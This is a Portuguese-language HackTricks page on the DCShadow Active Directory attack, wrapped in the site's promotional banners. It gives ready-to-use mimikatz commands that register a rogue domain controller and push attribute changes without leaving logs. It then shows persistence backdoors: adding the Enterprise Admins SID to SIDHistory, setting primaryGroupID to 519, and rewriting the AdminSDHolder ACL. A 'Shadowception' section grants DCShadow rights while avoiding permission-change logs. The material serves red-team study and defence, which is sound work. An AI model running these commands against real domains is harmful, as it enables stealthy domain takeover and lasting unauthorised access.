<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>


# DCShadow

Registra um **novo Controlador de Domínio** no AD e o utiliza para **inserir atributos** (SIDHistory, SPNs...) em objetos especificados **sem** deixar **logs** sobre as **modificações**. Você **precisa de privilégios DA** e estar dentro do **domínio raiz**.\
Observe que se você usar dados incorretos, logs bastante feios aparecerão.

Para realizar o ataque, você precisa de 2 instâncias do mimikatz. Uma delas iniciará os servidores RPC com privilégios do SISTEMA (você deve indicar aqui as alterações que deseja realizar), e a outra instância será usada para inserir os valores:

{% code title="mimikatz1 (servidores RPC)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% endcode %}

{% code title="mimikatz2 (push) - Necessita de DA ou similar" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

Observe que **`elevate::token`** não funcionará na sessão `mimikatz1` pois isso eleva os privilégios da thread, mas precisamos elevar o **privilégio do processo**.\
Você também pode selecionar um objeto "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Você pode fazer as alterações de um DA ou de um usuário com essas permissões mínimas:

* No **objeto de domínio**:
* _DS-Install-Replica_ (Adicionar/Remover Réplica no Domínio)
* _DS-Replication-Manage-Topology_ (Gerenciar Topologia de Replicação)
* _DS-Replication-Synchronize_ (Sincronização de Replicação)
* O **objeto Sites** (e seus filhos) no **contêiner de Configuração**:
* _CreateChild e DeleteChild_
* O objeto do **computador registrado como um DC**:
* _WriteProperty_ (Não Write)
* O **objeto alvo**:
* _WriteProperty_ (Não Write)

Você pode usar [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) para dar esses privilégios a um usuário não privilegiado (observe que isso deixará alguns logs). Isso é muito mais restritivo do que ter privilégios de DA.\
Por exemplo: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  Isso significa que o nome de usuário _**student1**_ quando conectado na máquina _**mcorp-student1**_ tem permissões DCShadow sobre o objeto _**root1user**_.

## Usando DCShadow para criar backdoors

{% code title="Definir Enterprise Admins em SIDHistory para um usuário" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% endcode %}

{% code title="Alterar o PrimaryGroupID (colocar usuário como membro dos Administradores de Domínio)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% endcode %}

{% code title="Modificar ntSecurityDescriptor do AdminSDHolder (dar Controle Total a um usuário)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - Dar permissões DCShadow usando DCShadow (sem logs de permissões modificadas)

Precisamos adicionar os seguintes ACEs com o SID do nosso usuário no final:

* No objeto de domínio:
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;SIDdoUsuário)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;SIDdoUsuário)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;SIDdoUsuário)`
* No objeto de computador do atacante: `(A;;WP;;;SIDdoUsuário)`
* No objeto de usuário alvo: `(A;;WP;;;SIDdoUsuário)`
* No objeto Sites no contêiner de Configuração: `(A;CI;CCDC;;;SIDdoUsuário)`

Para obter o ACE atual de um objeto: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Observe que, neste caso, você precisa fazer **várias alterações,** não apenas uma. Portanto, na sessão **mimikatz1** (servidor RPC), use o parâmetro **`/stack` com cada alteração** que deseja fazer. Dessa forma, você só precisará fazer **`/push`** uma vez para realizar todas as alterações empilhadas no servidor falso.



[**Mais informações sobre DCShadow em ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
